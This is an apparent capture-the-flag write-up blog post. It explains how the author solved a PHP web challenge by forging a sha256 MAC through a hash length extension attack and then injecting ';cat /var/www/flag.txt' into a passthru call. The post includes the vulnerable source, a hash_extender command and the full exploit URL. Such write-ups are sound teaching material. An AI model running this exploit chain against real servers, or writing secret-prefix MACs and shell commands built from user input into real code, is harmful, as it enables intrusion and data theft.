@@ -1,0 +1,230 @@
+I"�/<h2 id="description">Description</h2>
+
+<p><img src="/assets/img/post_images/ec6165ad18424803876d01a024adcda0.png" alt="c9fd42053c1860b5e8adc479279ffeef.png" /></p>
+
+<h2 id="solving">Solving</h2>
+
+<p>Given a simple website that looks like this.</p>
+
+<p><img src="/assets/img/post_images/1f07699a5c3a4904a02dc7d34bc68f56.png" alt="0956ba0662dbb4f93d2dcaa8e8f2527a.png" /></p>
+
+<p>Examining the response of the request, we could found some interesting headers.</p>
+
+<p><img src="/assets/img/post_images/64d64912595a4428b87bab10e38b0aeb.png" alt="662190ad5e6f3fa71a40cf56ef3f4240.png" /></p>
+
+<p>Sending the <code class="language-plaintext highlighter-rouge">?debug</code> parameter to the website showed us the source code of the challenge.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+</pre></td> --><td class="rouge-code"><pre>&lt;?php
+error_reporting(0);
+ini_set('display_errors', 0);
+
+require_once("secret.php");
+
+function patched($alg, $string, $secret) 
+{
+    if (is_string($string)) {
+        if ($alg === "sha256") {
+            return hash($alg, $secret . $string);
+        }
+        else {
+            header('HTTP/1.0 400 Bad Request');
+            echo "That algorithm is not supported at the moment.";
+            exit;
+        }
+    }
+    else {
+        header('HTTP/1.0 400 Bad Request');
+        echo "Wouldn't work anymore hahahaha!";
+        exit;
+    }
+
+}
+
+$alg = "sha256";
+$greet = "aboutme.txt";
+header("X-MY-GREET: $greet");
+header("X-MY-GREET-MAC: " . patched($alg, $greet, $secret));
+header("X-SELF-NOTE: '?debug' in case I forgot.");
+
+if (isset($_GET['debug'])) {
+    highlight_file( __FILE__ );
+}
+
+if (empty($_GET['mac']) || empty($_GET['greet'])) {
+    header('HTTP/1.0 400 Bad Request');
+    echo "You need to provide 'mac' and 'greet', okay?";
+    exit;
+}
+
+if (isset($_GET['alg'])) $alg = $_GET['alg'];
+
+if (isset($_GET['greet'])) $greet = $_GET['greet'];
+
+if (isset($_GET['nonce'])) $secret = patched($alg, $_GET['nonce'], $secret);
+
+$mac = patched($alg, $greet, $secret);
+
+// I still need to make sure the string is safe. Should this do?
+$greet = filter_var($greet, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);
+
+if ($mac !== $_GET['mac']) {
+    header('HTTP/1.0 403 Forbidden');
+    echo "Nah it doesn't match.";
+    exit;
+}
+
+// This is for testing, gonna make it dangerous since this won't be executed at all :).
+echo passthru("cat $greet 2&gt;&amp;1", $err);
+// echo $err;
+
+?&gt; You need to provide 'mac' and 'greet', okay?
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>There is some interesting information that we can get by statically analyzing the source code. Here are them:</p>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">$greet</code> variable is supposed to contain a name of a file; and we can control the value as this line of code shows:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> if (isset($_GET['greet'])) $greet = $_GET['greet'];
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>If you get the reference, this challenge is based on <a href="https://www.youtube.com/watch?v=MpeaSNERwQA">this</a> video on Youtube by LiveOverflow. <code class="language-plaintext highlighter-rouge">hash_hmac</code> function in that video is more or less the same with <code class="language-plaintext highlighter-rouge">patched</code> function in this challenge, but supplying an array into the function would not work anymore because of this line of code:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre> if (is_string($string)) {
+     ...
+ }
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>Anyway, if you don’t understand what I’m talking about, please watch the video, it’s all there :).</p>
+  </li>
+  <li>
+    <p>The <code class="language-plaintext highlighter-rouge">patched</code> function validates our input and returns a message-digested hash value from the input. The difference between this and the function in <a href="https://www.youtube.com/watch?v=MpeaSNERwQA">that</a> video is: with the intention of patching (or should I say securing) the application, this challenge uses <code class="language-plaintext highlighter-rouge">hash</code> function instead of <code class="language-plaintext highlighter-rouge">hash_hmac</code> function to generate the hash value. By doing that, the application is potentially vulnerable to <em>Hash Length Extension Attack</em>. We’ll come back to this very soon.</p>
+  </li>
+  <li>This line of code:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> $greet = filter_var($greet, FILTER_UNSAFE_RAW, FILTER_FLAG_STRIP_LOW|FILTER_FLAG_STRIP_HIGH);
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>basically strips out every special character from the <code class="language-plaintext highlighter-rouge">$greet</code> variable.</p>
+  </li>
+  <li>
+    <p>If the <code class="language-plaintext highlighter-rouge">mac</code> we provide (<code class="language-plaintext highlighter-rouge">$_GET['mac'</code>) is not equals to the generated <code class="language-plaintext highlighter-rouge">mac</code> value, the application is terminated. So we need to make sure that both are the same.</p>
+  </li>
+  <li>Finally, this line of code:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre> echo passthru("cat $greet 2&gt;&amp;1", $err);
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>is how we are gonna get the flag. The <code class="language-plaintext highlighter-rouge">$greet</code> variable, which we can control, will be passed into <code class="language-plaintext highlighter-rouge">passthru</code> function; which will then be executed as a shell command.</p>
+  </li>
+</ol>
+
+<p><em>Hash Length Extension Attack</em> is a type of attack where an attacker can use a computed hash <code class="language-plaintext highlighter-rouge">(Hash(*message1*))</code> and the length of the message (message1*) to calculate another hash <code class="language-plaintext highlighter-rouge">(Hash(*message1* || *message2*))</code> for an attacker-controlled message. An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data (read more <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">here</a>).</p>
+
+<p>This challenge gives us a hash value and it’s original data by sending the <code class="language-plaintext highlighter-rouge">X-MY-GREET</code> and <code class="language-plaintext highlighter-rouge">X-MY-GREET-MAC</code> header on the response. Thus, without knowing the secret, we can generate a valid hash for <code class="language-plaintext highlighter-rouge">secret + greet.txt + &lt;arbitrary evil data&gt;</code> without knowing the value of the prepended secret. We can use <em>bash command separation</em> to execute arbitrary command after reading the value of <code class="language-plaintext highlighter-rouge">greet.txt</code>. Simply put, this would be the payload we want to be passed to the <code class="language-plaintext highlighter-rouge">passthru</code> function:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>echo greet.txt;cat /var/www/flag.txt 2&gt;&amp;1
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The location of the flag can be found on the hint published for this challenge.</p>
+
+<p>There are many tools out there, but for this writeup, <a href="https://github.com/iagox86/hash_extender">this</a> tool from Ron Bowes will help us doing the <em>Length Extension Attack</em>. And here’s how we used them:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>hash_extender -d 'aboutme.txt' -s cabb57d8fb9ab6dbccbef600f370108ad331617dc5432fb55d0b4f2b7f5df01c -a ';cat /var/www/flag.txt' -f sha256 -l 25 --out-data-format=html
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>From the manual:
+<code class="language-plaintext highlighter-rouge">-d</code> is the original string that we’re going to extend
+<code class="language-plaintext highlighter-rouge">-s</code> is the original signature or the hash value of the original string
+<code class="language-plaintext highlighter-rouge">-a</code> is the data that we want to append to the original string
+<code class="language-plaintext highlighter-rouge">-f</code> is the hash algorithm
+<code class="language-plaintext highlighter-rouge">-l</code> is the length of the secret, which is leaked when we visit <code class="language-plaintext highlighter-rouge">secret.php</code> page</p>
+
+<p><img src="/assets/img/post_images/2d86a44f5e294cadbda6a4d893b1b275.png" alt="5fb70b6dbb0ed2b07a53175556086711.png" /></p>
+
+<p>Then we get our new hash and new message.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>New signature: 3686b8643ff253c607ee7c4fdb838cef93caa99c0dc52f6c8ca028d0b257749c
+New string: aboutme%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01+%3bcat+%2fvar%2fwww%2fflag%2etxt
+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/post_images/e49e327073c740f7a2194e00ef28c372.png" alt="98365288a99edd441e4e4743df0298b5.png" /></p>
+
+<p>Don’t worry about the null bytes in the new message, because fortunately the challenge used <code class="language-plaintext highlighter-rouge">filter_var</code> and those null bytes will be stripped before being passed into <code class="language-plaintext highlighter-rouge">passthru</code> function.</p>
+
+<p>Send the hash and the message to the application like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td> --><td class="rouge-code"><pre>http://192.81.210.234:10002/?mac=3686b8643ff253c607ee7c4fdb838cef93caa99c0dc52f6c8ca028d0b257749c&amp;greet=aboutme%2etxt%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01+%3bcat+%2fvar%2fwww%2fflag%2etxt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And there’s the flag.</p>
+
+<p><img src="/assets/img/post_images/3d59ab4e510d4dad9a613a30c21e5100.png" alt="44cba8a2af6184dd0fe48900c4f53949.png" /></p>
+
+<h2 id="the-flag">The Flag</h2>
+<p>Flag is <strong>HilltopCTF{uh…1think_1mad3_itwors3_s00wy}</strong></p>
+:ET
